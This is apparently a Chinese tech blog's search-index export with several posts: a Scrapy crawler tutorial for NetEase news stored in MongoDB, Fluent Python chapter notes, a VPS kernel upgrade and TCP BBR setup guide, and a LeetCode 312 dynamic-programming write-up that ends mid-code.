123456789101112scrapy startproject crawlertree crawler.├── crawler│ ├── __init__.py│ ├── items.py│ ├── middlewares.py│ ├── pipelines.py│ ├── settings.py│ └── spiders│ └── __init__.py└── scrapy.cfg scrapy startproject crawler 这行命令创建了一个新的工程文件夹，文件夹的结构使用tree命令展示出来了。这些文件的主要作用: (1) scrapy.cfg 项目的配置文件(2) crawler/ :Python代码存放的位置(3) crawler/items.py: items文件，定义一个(或多个)item的属性(4) crawler/pipelines: 项目的管道文件。 在scrapy的官方文档中，pipeline的作用是： 清洗html数据； 验证已经爬取的数据(检查item是否有特定属性)； 去重； 将爬取的item存进数据库。 (5) crawler/settings.py 配置文件(6) crawler/spiders/ :爬虫文件的目录 2. 爬虫的编写2.1 定义Item简单来说，item的作用是装载抓取到的数据，是一种类似字典的容器。它的属性都会定义为scrapy.item.Field对象。 由于我们要写的是一个爬取新闻的app, 首先要明确的是我们需要的数据是什么，对于一个爬虫来说, 重要的是能否取我所需, 而不是尽我所能爬取对应网站的所有数据。那么对于一个新闻爬虫，我们爬到的每一条新闻都需要一些什么样的数据呢？ category 新闻类型(按照包含的媒体 分为图片/视频) source_type 新闻来源的类型(app, 微博, 微信, 网站, 电子报 etc.) source_name 新闻来源的名称 news_sign 一条新闻的唯一标识(可以用于去重) views 浏览量 title 标题 url 新闻链接 publish_time 发布时间 text 新闻文本 images 新闻图片的列表 以上就是我们需要的一些数据，我们按照上面的列表定义一个item 1234567891011121314from scrapy.item import Item, Fieldclass NewsCrawlerItem(Item): category = Field() source_type = Field() source_name = Field() news_sign = Field() views = Field() title = Field() url = Field() publish_time = Field() text = Field() images = Field() 2.2 编写爬虫Spider是爬虫的核心部分，用于从一个(或一系列)网站爬取数据。要建立一个Spider，你必须为scrapy.spider.BaseSpider创建一个子类，并确定三个主要的、强制的属性： name 爬虫名称，必须是唯一的 start_urls 起始页面 parse() 解析爬取到的数据所用的方法, 接受的唯一参数是scrapy.Request方法请求得到的Response对象 2.2.1 关于二维爬取一个典型的爬虫在两个方向移动： 水平方向：从一个索引页到另一个索引页 垂直方向：从索引页面到下一级页面(可能是下一级的索引，或者内容页面) 这个例子中水平方向是网易新闻的一页新闻到另一页，它返回的是一个个的新闻列表；垂直方向是从新闻列表逐个进入新闻的内容界面 2.2.2 关于从网页(或者HTTP请求的Response Body)中提取数据 html 网页的数据可以用 beautifusoup/xpath/正则 提取 json 直接解析成Python的字典即可 xml python也有对应的库用于解析 本文的爬虫会用到json和html解析，这里html使用xpath解析。 2.2.3 一个网易新闻app的Spider1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#coding:utf-8import datetimeimport socketimport jsonimport scrapyimport urlparsefrom scrapy.loader.processors import MapCompose, Joinfrom scrapy.loader import ItemLoaderfrom scrapy.http import Requestfrom news_crawler.items import NewsCrawlerItemclass BasicSpider(scrapy.Spider): name = "netease" allowed_domains = ["163.com"] # Start on the first index page chls = [ "T1370583240249", "T1348649145984", "T1348647909107", "T1348648037603", "T1368497029546", "T1348648141035", "T1474271789612", "T1467284926140", "T1492136373327", "T1348648517839", "T1348648650048", "T1498701411149", "T1348648756099", "T1473054348939", "T1356600029035", "T1348649079062", "T1348649503389", "T1348649176279", "T1348649475931", "T1411113472760", "T1486979691117", "T1348649580692", "T1348649654285", "T1348649776727", "T1350383429665", "T1421997195219", "T1456394562871", "T1348654060988", "T1348654085632", "T1491816738487", "T1348654105308", "T1348654151579", "T1348654204705", "T1414389941036", "T1401272877187", "T1385429690972", "T1348654225495", "T1397116135282", "T1444270454635", "T1481105123675", "T1503456682313", "T1464592736048", "T1504171773862", "T1348650593803", "T1348650839000", "T1414142214384", "T1441074311424", "T1482470888760", "T1499853820829", "T1509504918215", "T1502955728035", "T1509448512433", "T1419315959525", "T1419316284722", "T1419316384474", "T1419316531256", "T1427878984398", "T1433137697241", "T1449126525962", "T1456112189138", "T1493374039495", "T1456112438822", "T1468031118349", "T1488432440430", "T1488432474929", "T1504689350701" ] start_urls = ( 'http://c.m.163.com/nc/article/list/%s/0-20.html'%chlid for chlid in chls ) def parse(self, response): # Get the next index URLs and yield Requests url_spl = response.url.split('/') chl_url = '/'.join(url_spl[:-1]) chl_id = url_spl[-2] items = json.loads(response.body)[chl_id] # Get item URLs and yield Requests for item in items: if 'url_3w' in item and item['url_3w']: news_url = item['url_3w'] if '_mobile' not in news_url and '3g.163.com' not in news_url: news_url = news_url.replace('.html', '_mobile.html') yield Request(news_url, callback=self.parse_item, dont_filter=True) if len(items) == 20: page_num = int(url_spl[-1].split('-')[0]) /20 + 1 yield Request(chl_url+'/%d-%d.html'%(page_num*20, page_num*20+20), callback=self.parse, dont_filter=True) def parse_item(self, response): """ This function parses a netease page. @returns item @scrapes category source_type source_name news_sign views title url publish_time text images """ # Create the loader using the response item = NewsCrawlerItem() item['category'] = 'image' item['source_type'] = 'app' item['source_name'] = self.name item['news_sign'] = '' item['views'] = 0 item['url'] = response.url item['title'] = response.xpath('//h1/text()').extract()[0] # Load fields using XPath expressions if '3g.163.com' in response.url: item['publish_time'] = response.xpath('//*[@property="article:published_time"]/@content').extract()[0][:19].replace('T','') item['text'] = ''.join(response.xpath('//*[@class="content"]//p/text()').extract()) item['images'] = response.xpath('//*[@class="content"]//img/@src').extract() item['news_sign'] = 'netease'+response.xpath('//article/@id').extract()[0] else: item['publish_time'] = response.xpath('//*[@id="articleBody"]/div[1]/span[1]/text()').extract()[0] item['text'] = ''.join(response.xpath('//*[@class="article-body"]//p/text()').extract()) item['images'] = response.xpath('//*[@class="article-body"]//img/@src').extract() item['news_sign'] = 'netease'+response.xpath('//*[@id="docId"]/@value').extract()[0] return item 2.2.4 爬虫代码代码的解析上面提到过parse接受response作为参数。这里重点说一下parse()方法中的两个生成器yeild,分别代表了垂直爬取和水平爬取。首先说一下Request对象: 12345class Request(object_ref): def __init__(self, url, callback=None, method='GET', headers=None, body=None, cookies=None, meta=None, encoding='utf-8', priority=0, dont_filter=False, errback=None, flags=None): 这里我们使用到了3个参数,url,callback,dont_filter。我们第一次使用yeild是请求新闻的内容页面，这里的回调函数是parse_item()，用来提取单个新闻的信息;第二次使用yeild是请求“下一页”的数据，这里的回调函数是parse(),当然从scrapy的官方文档来看，这里不传callback的话，默认的回调函数也是parse(),这样下一页的数据也会再一次通过parse()解析，实现水平方向上的爬取。dont_filter是告诉Request不要对url进行过滤(去重) 下面的parse_item()就是html的解析了，这里不赘述。 3 爬取到的数据存储这里我们用mongoDb对爬取到的数据进行存储。 3.1 配置MongoDB信息在settings.py中设置MongoDB的信息 12345# MongoDB settingsMONGODB_SERVER = "$mongo_server"MONGODB_PORT = 27017MONGODB_DB = "news"MONGODB_COLLECTION = "news_item" 这里server的ip隐去了 3.2 编写MongoDBPipeline123456789101112131415161718192021222324252627from pymongo import MongoClientfrom scrapy.conf import settingsfrom scrapy.exceptions import DropItemfrom scrapy import logclass MongoDBPipeline(object): def __init__(self): client = MongoClient( settings['MONGODB_SERVER'], settings['MONGODB_PORT'] ) news_db = client[settings['MONGODB_DB']] self.collection = news_db[settings['MONGODB_COLLECTION']] def process_item(self, item, spider): valid = True if not item['news_sign']: valid = False raise DropItem("Missing item!") if valid: self.collection.insert(dict(item)) log.msg("news added to MongoDB database!", level=log.INFO, spider=spider) return item 这个pipeline的作用包括上面提到的验证已经爬取的数据和将爬取的item存进数据库。去重暂时还没有做处理。 3.3 配置pipeline 在settings.py中添加下面的配置 123 ITEM_PIPELINES = &#123; 'news_crawler.pipelines.mongodb_ppl.MongoDBPipeline': 300,&#125; 可以看到这是一个字典，键为pipeline的路径，值为优先级(值越小越优先)。 4.总结按照上面的步骤走下来，大概就能编写出一个网易新闻的爬虫。这个爬虫写出来，大概就迈出了重构以前爬虫代码的第一步了 后面碰到什么问题也会更新上来的，敬请期待]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>scrapy</tag>
        <tag>crawler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fluent python 第三章小记]]></title>
    <url>%2F2017%2F11%2F23%2Ffluent-python-3%2F</url>
    <content type="text"><![CDATA[Fluent Python 第三章读书报告 Chapter 3. Dictionaries and Sets字典和集合dict 类型不但在各种程序里广泛使用，它也是 Python 语言的基石。模块的命名空间、实例的属性和函数的关键字参数中都可以看到字典的身影。跟它有关的内置函数都在__builtins__.__dict__模块中。Python 对字典做了高度优化，python字典性能优秀的原因是散列表。集合同样依赖散列表。 *有部分翻译存在疑问，用括号标注原英文正文。 泛映射类型collections.abc 模块中有 Mapping 和 MutableMapping 这两个抽象基类,它们的作用是为 dict 和其他类似的类型定义形式接口。非抽象映射类型一般不会直接继承这些抽象基类，它们会直接对 dict 或是collections.User.Dict 进行扩展。这些抽象基类的主要作用是作为形式化的文档。 标准库里的所有映射类型都是利用 dict 来实现的，因只有可散列的数据类型才能用作这些映射里的键。 可散列的数据类型如果一个对象是可散列的，那么在这个对象的生命周期中，它的散列值是不变的，而且这个对象需要实现 __hash__() 方法。另外可散列对象还要有__eq__() 方法，这样才能跟其他键做比较。 Python文档https://docs.python.org/3/glossary.html#term-hashable中提到，所有不可变的类型都是可散列的，但元组是一个例外，元组可散列的条件是元组的元素都可以散列。一个对象可散列的条件是：如果一个对象实现了__eq__方法，并且在方法中用到了这个对象的内部状态的话，那么只有当所有这些内部状态都是不可变的情况下，这个对象才是可散列的。 创建字典的不同方式1234567&gt;&gt;&gt; a = dict(one=1, two=2, three=3)&gt;&gt;&gt; b = &#123;'one': 1, 'two': 2, 'three': 3&#125;&gt;&gt;&gt; c = dict(zip(['one', 'two', 'three'], [1, 2, 3]))&gt;&gt;&gt; d = dict([('two', 2), ('one', 1), ('three', 3)])&gt;&gt;&gt; e = dict(&#123;'three': 3, 'one': 1, 'two': 2&#125;)&gt;&gt;&gt; a == b == c == d == eTrue 除此之外，字典推导也能创建一个字典, 和列表推导类似 12345678910111213&gt;&gt;&gt; DIAL_CODES = [ ... (86, 'China'),... (91, 'India'),... (1, 'United States'),... (62, 'Indonesia'),... (55, 'Brazil'),... (92, 'Pakistan'),... (880, 'Bangladesh'),... (234, 'Nigeria'),... (7, 'Russia'),... (81, 'Japan'),... ]&gt;&gt;&gt; country_code = &#123;country: code for code, country in DIAL_CODES&#125; 常用的映射方法这里讲到一个能让程序更加高效的方法 setdefault()，能节省很多次的键查询。 例如：2.1: 1my_dict.setdefault(key, []).append(new_value) 2.2 123if key not in my_dict: my_dict[key] = []my_dict[key].append(new_value) 操作2.1和2.2达到的效果是一样的，但是2.1只用了一次键查询，而2.2会用到2-3次(是否有key存在) 映射的弹性键查询(flexible key lookup)场景：为了方便起见，就算某个键在映射里不存在，我们也希望在通过这个键读取值的时候能得到一个默认值。有两个方法能实现：使用defaultdict类或者自己实现一个类继承dict,实现__missing__方法。 defaultdict有一个新字典dd = defaultdict(list),当使用表达式dd[key]而key在defaultdict中不存在的话，就会用list()建立新列表作为值，key作为键放入dd中，然后返回这个列表的引用。这个用来生成默认值的可调用对象放在default_factory这个实例属性中。 特殊方法 __missing__()当一个继承了dict的类实现了__missing__方法，在查询一个不存在的键的时候就会调用这个方法。值得一提的是，只有__getitem__方法会调用__missing__方法。 字典的变种 collections.OrderedDict:这个类的对象在添加键的时候会保持顺序，键的迭代顺序总是一样的 collections,ChainMap:可以容纳数个映射对象，进行键查询的时候会逐个查询，直到找到为止。 collections.Counter: 每次更新一个键的时候就会增加这个键的计数器, 比较有用的方法是most_common(n) 按次序返回最常见的n个键和他们的计数。 collections.UserDict: 把标准dict用Python实现用于用户继承这个类，编写子类。 继承UserDict编写子类更倾向于从 UserDict 而不是从 dict 继承的主要原因是，后者有时会在某些方法的实现上走一些捷径，导致我们不得不在它的子类中重写这些方法，但是 UserDict 就不会带来这些问题。 12345678910import collectionsclass StrKeyDict(collections.UserDict): def __missing__(self, key): if isinstance(key, str): raise KeyError(key) return self[str(key)] def __contains__(self, key): return str(key) in self.data def __setitem__(self, key, item): self.data[str(key)] = item UserDict 中有一个属性叫做data,它是dict 的一个实例，用于存储数据。 不可变的映射类型标准库里所有的映射类型都是可变的，但有时候也会有需要用到不可变映射的地方，例如不能让用户修改的映射。 Python 3.3 开始，types 模块中引入了一个封装类名叫 MappingProxyType。如果给这个类一个映射，它会返回一个只读的映射视图。虽然是个只读视图，但是它是动态的。这意味着如果对原映射做出了改动，我们通过这个视图可以观察到，但是无法通过这个视图对原映射做出修改。 * 何为副本？何为视图？副本：就是原有数据的一份拷贝。视图：可理解为原有数据的一个别称或引用，通过该别称或引用亦便可访问、操作原有数据，但原有数据不会产生拷贝。 集合集合的本质是许多唯一对象的聚集，所以集合的其中一个用途是去重。 集合还实现了很多基础的中缀运算符。给定两个集合 a 和 b，a | b 返回的是它们的合集，a &amp; b 得到的是交集，而 a - b 得到的是差集。合理地利用这些操作，不仅能够让代码的行数变少，还能减少 Python 程序的运行时间。这样做同时也是为了让代码更易读。 除了速度极快的查找功能（这也得归功于它背后的散列表），内置的 set 和 frozenset提供了丰富的功能和操作。 set Literals（翻译比较诡异:集合字面量？？？）建立一个集合的时候可以使用{1，2..}类似的操作，但是创建空集的时候只能使用set()构造方法。 集合推导(类似列表推导)1&#123;chr(i) for i in range(32, 256) if 'SIGN' in name(chr(i),'')&#125; 集合的操作 dict和set的背后要理解Python里字典和集合的长处和短处，它们背后的散列表是必须注意的。 Python里的字典和集合的效率有多高？ 由于散列表的存在，效率是非常高的（列表由于没有散列表，表现非常差） dict的实现及其导致的结果 键必须可散列（hashable） 一个可散列的对象必须满足以下要求。 (1) 支持 hash() 函数，并且通过 hash() 方法所得到的散列值是不变的。 (2) 支持通过 eq() 方法来检测相等性。 (3) 若 a == b 为真，则 hash(a) == hash(b) 也为真。所有由用户自定义的对象默认都是可散列的，因为它们的散列值由 id() 来获取，而且它们都是不相等的。 内存开销巨大 由于使用了散列表，而散列表本身稀疏，会导致空间效率低下。空间的优化工作可以等到真正需要的时候开启，优化往往是可维护性的对立面。 键查询快 由于在空间上的巨大花销，使得时间上的效率很高。 键的次序取决于添加顺序 与建立hash表的时候发生的散列冲突有关。 往字典里添加新键可能会改变已有键的顺序 这个和散列冲突有关，所以慎重进行迭代一个字典的所有键的过程中同时对字典进行修改这种操作，很有可能会跳过一些已有的键。 set的实现和导致的结果由于也是基于散列表实现的，set的特点和上一小节提到的dict如出一辙: 集合里的元素必须可散列 内存开销大 能很快查询元素是否存在于集合 元素的顺序取决于添加的顺序 添加新元素可能改变已有顺序]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>fluent python</tag>
        <tag>dict</tag>
        <tag>set</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fluent python 第二章小记]]></title>
    <url>%2F2017%2F11%2F11%2Ffluent-python-2%2F</url>
    <content type="text"><![CDATA[Fluent Python 第二章读书报告 Chapter 2. An Array of Sequences序列构成的数组 Python内置序列： 一种分类方式是根据存放数据的方式分类(指针/数值) 容器序列： list, tuple, collections.deque.这类序列可以存放不同类型的数据，这类序列存放的都是对象的引用(指针) 扁平序列： str, bytes, bytearray, memoryview, array.array.只能存放一种数据类型，相比容器序列，这类序列是将元素的值直接存放在序列对应的内存空间，而不是将元素当做单独的对象存放，这类序列更加紧凑，但是只能存放数字，字节和字符。另一种分类方式是根据序列存放的元素是否可变分类： 可变序列： list, bytearray, array.array, collections.deque, memoryview 不可变序列： tuple, str, and bytes序列是否可变可以通过下面的图直观展示：图中列出的类都来自collections.abc(abc是 abstract base classes缩写)可以看到MutableSequence有很多方法继承自Sequence(箭头由子类指向超类，斜体指抽象类和抽象方法)。 列表推导和生成器表达式 1.列表推导 使用列表推导通常可以让你的Python代码更加简洁可读，大多数情况下也会更快，比如： 1listi = [i**2 for i in xrange(10)] - Python2中列表推导的表达式没有独立的作用域，Python3中得到了改善。 - map/filter 可以与列表推导完成相同的工作。 12345678910symbols = '$¢£¥€¤'beyond_ascii = [ord(s) for s in symbols if ord(s) &gt; 127]beyond_ascii = list(filter(lambda c: c &gt; 127, map(ord, symbols))) ``` - 示例：使用列表推导求笛卡尔积： ```pythoncolors = ['black', 'white']sizes = ['S', 'M', 'L']tshirts = [(color, size) for color in colors for size in sizes] **2.生成器表达式** - 生成器表达式背后遵守了迭代器协议，可以逐个地产出元素，而不是先建立一个完整的列表，然后再把这个列表传递到某个构造函数里。这样可以有效节省内存。 - 示例：生成一个array: 12array.array('I', (ord(symbol) for symbol in symbols)) array('I', [36, 162, 163, 165, 8364, 164]) - 在计算笛卡尔积的这个问题中, 与列表推导不同的是，生成器表达式会在每次 for 循环运行时才生成一个组合, 而不是两个for循环生成一个含有所有元素的列表。避免了内存的额外占用。（这个不是很懂怎么做到的） **3.元组(tuple)** 元组是对一组数据的记录，存放了一个数据和这个数据对应的位置，而不仅仅是“不可变的列表”，元组也是可以嵌套的, 当做不可变列表时，缺少那些使得自身变化的方法。 - for 循环可以分别提取元组里的元素，也叫作拆包（unpacking）。拆包的用法有很多： 1. 平行赋值：把一个可迭代对象里的元素，一并赋值到由对应的变量组成的元组中。 2. 不使用中间变量交换两个变量的值 3. 用* 运算符把一个可迭代对象拆开作为函数的参数 4. 让一个函数可以用元组的形式返回多个值 拆包时可以用占位符_ 帮助处理不感兴趣的元素，也可以把注意力放在一部分元素上，用*处理剩下的元素。 一个例子： 1234567891011121314 t = (20, 8) quotient, remainder = divmod(*t) ``` **4.具名元组（namedtuple）** collections.namedtuple 是一个工厂函数，它可以用来构建一个带字段名的元组和一个有名字的类 - 一个简单的示例： ```python from collections import namedtuple City = namedtuple('City', 'name country population coordinates') tokyo = City('Tokyo', 'JP', 36.933, (35.689722, 139.691667)) 5.切片 Python中的序列类型都支持切片操作。 对对象进行切片:s[start:end:step] start:end:step 这种用法只能作为索引或下标用在[]中。使用时会调用s.__getitem__(slice(start,end,step))这个方法这里的start:end:step也可以替换成slice(start,end,step),这种方法可以给切片命名，使得代码更有可读性。 省略(…)和多维切片，标准库中暂无用法，用于用户自定义类或者拓展，比如numpy。 切片也可以就地修改可变序列: 如果把切片放在赋值语句的左边，或把它作为 del 操作的对象，我们就可以对序列进行嫁接、切除或就地修改操作。 6. 序列的+和*操作 如果在 a * n 这个语句中，序列 a 里的元素是对其他可变对象的引用的话,需要格外注意了,复制后的引用可能指向同一个对象，修改其中一个时，其他引用也会被修改。例如： &gt;&gt;&gt; s = [[1,1,1]]*3 &gt;&gt;&gt; s [[1, 1, 1], [1, 1, 1], [1, 1, 1]] &gt;&gt;&gt; s[0][0] = 2 &gt;&gt;&gt; s [[2, 1, 1], [2, 1, 1], [2, 1, 1]] 增量赋值（+=/*=）: += 背后的特殊方法是__iadd__(), 在a+=b中，如果a实现了__iadd__(),这个表达式会立刻改变a这个对象，如果没有实现这个方法,这个表达式就会完成a = a+b 的操作,即创建a+b这个对象，将变量a指向新的变量。*=也类似，不过背后的特殊方法是imul() 一个特殊的例子： &gt;&gt;&gt; t = (1, 2, [30, 40]) &gt;&gt;&gt; t[2] += [50, 60] Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt; TypeError: 'tuple' object does not support item assignment &gt;&gt;&gt; t (1, 2, [30, 40, 50, 60]) 7. sort方法和sorted函数list.sort函数会就地修改列表，返回值为None.sorted函数会新建一个排好序的列表作为返回值他们都接收两个参数reverse(是否反转) 和key(排序所用的值) 8. bisect用于管理已排序的序列bisect 模块包含两个主要函数，bisect 和 insort，两个函数都利用二分查找算法来在有序序列中查找或插入元素。bisect(haystack,needle)haystack.insert(index, needle)bisort(seq, num) 9. 当列表不是首选时 数组（array）:如果列表只包含纯数字，array.array比list高效 内存视图、NumPy SciPy, 双向队列（collections.deque）]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>fluent python</tag>
        <tag>sequence</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jetbrain系列软件破解]]></title>
    <url>%2F2017%2F09%2F26%2Fjetbrain_crack%2F</url>
    <content type="text"><![CDATA[破解方式如图]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>software</tag>
        <tag>crack</tag>
        <tag>jetbrains</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fluent python 第一章小记]]></title>
    <url>%2F2017%2F07%2F14%2Ffluent-python-chapter1-note%2F</url>
    <content type="text"><![CDATA[Fluent Python 第一章读书笔记 Chapter 1. The Python Data ModelPython数据模型 特殊方法：magic method/dunder method (double underscores (i.e., __getitem__())) 特殊方法使对象能实现，支持基本的语言框架并与之交互,例如： Iteration 迭代 Collections 集合 Attribute access 访问属性 Operator overloading 运算符重载 Function and method invocation 函数和方法调用 Object creation and destruction 对象的创建和销毁 String representation and formatting 字符串表示和格式化 Managed contexts (i.e., with blocks) 管理上下文 namedtuple的使用： 12345678910&gt;&gt;&gt; import collections&gt;&gt;&gt; Card = collections.namedtuple('Card', ['x','y']) &gt;&gt;&gt; card = Card(11,22) &gt;&gt;&gt; print card.x11&gt;&gt;&gt; print card.y22 &gt;&gt;&gt; x, y = card&gt;&gt;&gt; print x,y11 22 使用特殊方法的好处： 类的使用者不需要记忆随意定义的标准方法名。（例如：怎样获取对象中元素的数量，.size()? .length()? 如果用特殊方法__len__()可以直接调用len(object)） 类的使用者更容易从Python庞大的标准库中获益，并且可以避免重造轮子（例如：random.choice函数） __getitem__()方法使得类可以进行迭代(iterable),可以进行切片(index slicing) 使用特殊方法需要注意的： 特殊方法不是给人用的，而是给Python解释器用的，一般我们用len(my_obj)而不是my_obj.__len__() 对于list, str, bytearray之类的内置类型，使用len()时，CPython 解释器直接返回PyVarObject的ob_size这个属性的值，这比调用len()方法快得多。PyVarObject是一个代表所有可变长度对象的C语言结构体。 一般对特殊方法的调用都是隐式的，比如for语句隐式地调用了iter()函数 通过内置的函数（例如 len、iter、str，等等）来使用特殊方法是最好的选择。这些内置函数不仅会调用特殊方法，通常还提供额外的好处(上面提到过)，而且对于一些内置的类来说，调用函数的速度更快。 不要随意使用特殊方法的命名方式命名一般的方法，可能会造成混淆。 特殊方法使用的举例(构造向量)： 对象的字符串表示：如果没有实现__repr__这个特殊方法，控制台就会出现 这样的表示，而如果我们实现了这个方法，控制台就能将对象的详细信息打印出来。__repr__方法中可以使用%r 获取不同类型属性的标准字符串表示，比如Vector(1, 2) 或 Vector(‘1’, ‘2’)__repr__ 需要尽可能没有歧义，并且提示如何使用类创建相同的变量与__str__的不同之处在于， __str__在str()函数或者 print对象时会被调用，__str__用于展示适合展示给终端用户的信息。如果二者只能选其中一个创建，那么__repr__是比较好的选择，因为Python解释器在找不到__str__时会调用__repr__作为替代。(StackOverflow) 算术运算：上面的向量对象使用__add__和__mul__实现了+和*运算。这两个运算的实现都是构造了新的对象，而不是对原来的对象进行改动。实际上这也是中缀运算的基本要求。 布尔运算: Python中的对象在需要的场景(比如if, while)可以作为bool值使用。一般用户自定义的对象都被默认为True，但是如果对象实现了__bool__或者__len__，情况就不一样了。如果实现了__bool__,对象的布尔值视为bool()的返回值；如果没有实现__bool__而实现了__len__，那么len()为0的对象就被视为False。 特殊方法一览： The Python Language Reference的“Data Model”这一章节列出了83个特殊方法，其中有47个用于实现算术运算，位运算和比较。 小结： 通过实现特殊函数，自定义的对象可以表现得更像是内置的对象，同时使得对象的使用更加便捷，更加Pythonic Python自定义对象的一个基本要求是提供自身的可用的字符串表示。一个用途是开发者用于debug和打印log，另一个用法是终端用户查看对象的信息。这两个功能分别用__repr__和__str__实现 对序列类型的对象的模拟是特殊方法使用最广泛的场景，比如前面提到的FrenchDeck Python 的运算符重载这一模式提供了丰富的数值类型，除了内置的类型之外，还有decimal.Decimal 和 fractions.Fraction。这些都支持中缀运算。]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>fluent python</tag>
        <tag>magic method</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VPS升级内核，开启TCP BBR 实现高效单边加速]]></title>
    <url>%2F2017%2F04%2F13%2Fubuntu_tcp_bbr%2F</url>
    <content type="text"><![CDATA[自从锐速发布以来，这款牛逼的单边加速神器的确为一些线路不太优秀的服务器带来了更优秀的体验。但是由于过高的价格和不再低端售卖。导致了我们除了使用这个软件的破解版之外，并没办法得到一个免费好用的单边加速功能。 1. 从锐速到BBR自从锐速发布以来，这款牛逼的单边加速神器的确为一些线路不太优秀的服务器带来了更优秀的体验。但是由于过高的价格和不再低端售卖。导致了我们除了使用这个软件的破解版之外，并没办法得到一个免费好用的单边加速功能。而由于破解并不完美，使得在使用中会出现一些无法解决的问题，比如随着运行时间变久，加速效果越来越差（体验中的问题就是youtube观看视频从流畅1080p到不流畅480p。。。。）但是去年下半年谷歌为我们带来了新的TCP拥塞控制算法BBR（Bottleneck Bandwidth and RTT)。 目前在 Linux Kernel 4.9 及之后的版本中加入了该算法，所以我们只要升级内核就可以使用BBR开启单边加速了。 2. 升级Ubuntu内核上面说到 BBR只被 Linux Kernel 4.9 以后的版本支持，而VPS多用一些比较稳定的旧版内核。所以我们要做的第一步就是升级内核: 首先查看自己的系统内核： 1$uname -a 如果 系统版本是4.9及以后, 升级内核这一步就可以跳过拉~ 到ubuntu官方内核源找到最新的内核：比如： http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.11-rc6/linux-image-4.11.0-041100rc6-generic_4.11.0-041100rc6.201704091331_amd64.deb 找到之后下载这个deb包： 1$ wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.11-rc6/linux-image-4.11.0-041100rc6-generic_4.11.0-041100rc6.201704091331_amd64.deb 安装内核： 1$ dpkg -i linux-image-4.11.0-041100rc6-generic_4.11.0-041100rc6.201704091331_amd64.deb 查看已安装的内核： 1$ dpkg-l|grep linux-image （可选）卸载旧版内核： 1$ apt-get purge $&#123;old_linux_image&#125; 更新 grub 文件并重启 12$ update-grub$ reboot 重启之后就是新内核拉~ 3. 开启 BBR 加速 修改系统配置文件 sysctl.config 12$ echo"net.core.default_qdisc=fq"&gt;&gt;/etc/sysctl.conf$ echo"net.ipv4.tcp_congestion_control=bbr"&gt;&gt;/etc/sysctl.conf 保存并应用修改 1$ sysctl-p 查看是否生效： 1$ sysctl net.ipv4.tcp_available_congestion_control 如果输出如下： net.ipv4.tcp_available_congestion_control=bbr cubic ren表明开启成功 4. 关闭 TCP BBR执行下面的命令修改系统配置： 1234sed-i'/net\.core\.default_qdisc=fq/d'/etc/sysctl.confsed-i'/net\.ipv4\.tcp_congestion_control=bbr/d'/etc/sysctl.confsysctl-preboot 执行完上面的代码，即 修改配置-重启VPS 之后就可以关闭BBR加速了。]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>vps</tag>
        <tag>tcp-bbr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LeetCode312 分治法和动态规划]]></title>
    <url>%2F2017%2F03%2F09%2FLeetCode312%2F</url>
    <content type="text"><![CDATA[LeetCode 312 解题报告 最近开始渐渐忙了起来，加上按Acceptance做题，后面题目也开始有点复杂了，所以只能勉强维持一天做一道题。今天下午差不多把这周任务完成了，所以稍微划下水，写一下这两天碰到的一个比较复杂的题目（对我来说=。= 题目如下： 312. Burst BalloonsTotal Accepted: 23001Total Submissions: 54845Difficulty: HardContributors: AdminGiven n balloons, indexed from 0 to n-1. Each balloon is painted with a number on it represented by array nums. You are asked to burst all the balloons. If the you burst balloon i you will get nums[left] nums[i] nums[right] coins. Here left and right are adjacent indices of i. After the burst, the left and right then becomes adjacent. Find the maximum coins you can collect by bursting the balloons wisely. Note:(1) You may imagine nums[-1] = nums[n] = 1. They are not real therefore you can not burst them.(2) 0 ≤ n ≤ 500, 0 ≤ nums[i] ≤ 100 Example: Given [3, 1, 5, 8] Return 167 nums = [3,1,5,8] –&gt; [3,5,8] –&gt; [3,8] –&gt; [8] –&gt; [] coins = 3 1 5 + 3 5 8 + 1 3 8 + 1 8 1 = 167 看到这个题目，最简单的想法是用回溯法，使用回溯法一共需要n步，第i步需要尝试选出的数有n-i个,这样我们得到的时间复杂度是O(n!)，非常大，所以这个方法没有尝试的必要。我们需要思考的是这个方法中有没有冗余的步骤可以简化。 我们可以注意到，每次选择爆破的气球，与上一步选择爆破的气球是没有关系的，这满足了动态规划“无后效性”的特点。 这样我们可以用从下到上的动态规划来解决这个问题，即计算小长度数组的最大积分值，通过小长度的数组的累加来计算整个数组的最大积分值。这样如果计算长度为k的子数组，需要需要找到的不同情况是C(k, n),需要从长度为1找到长度为n，这样最坏的情况也是O(n!)（。。。。。）虽然说没好多少，但是至少稍微简化了一点时间复杂度。。。。 在用上面的这个思路思考问题的时候，又可以注意到，子问题与父问题的解决方式非常类似，可以考虑用分治法递归的解决这个问题。 说到分治，我们最直观的想到的使用分治的方法是:当一个气球爆裂后，它两边的气球串分别形成爆裂前气球串的子问题。但是分治法要求的是相互独立的子问题，而照上面这种方法，由于爆破后，左边气球串的最后一个气球和右边气球串的最左边一个气球相邻了，这样导致的结果是分离出的两个子问题相互影响了，所以这种分治是不可行的。 如果我们逆向思维一下，找到最后爆破的气球，再把它的两边分成两个子问题来解决，可不可行呢？由于最后一个爆破的气球，爆破时长度为1，根据题目定义左右都用1来填充，这样由于额外填充的1，使得这个气球并不会影响子问题的划分，这样的分治是可行的。 最后我们选择了由下而上的动态规划和分治法解决题目所提到的问题。代码如下： 1234567891011121314151617class Solution(object): def maxCoins(self, nums): #增加气球串的边界 coins = [1] + [num for num in nums if num] + [1] n = len(coins) dp = [[0] * n for _ in xrange(n)] for l in xrange(2, n): #计算每个长度为l的子序列 for left in xrange(0, n-l): right = 